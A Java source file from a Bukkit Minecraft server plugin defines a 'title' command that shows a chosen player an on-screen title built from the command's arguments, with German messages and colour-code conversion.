package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_TITLE extends CommandBase {

    public Command_TITLE() {
        super("title", "<Spieler> <Nachricht>", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        try {
            Player vic = Bukkit.getPlayer(args[1]);
            String Nachricht = "";

            for (int i = 2; i < args.length; ++i) {
                Nachricht = Nachricht + args[i] + " ";
            }

            vic.sendTitle(Nachricht.replace("&", "§"), "");
            p.sendMessage(Start.INSTANCE.chatPrefix + "Spieler bekommt nun diesen Title :)");
        } catch (Exception ignored) {
        }
    }

}
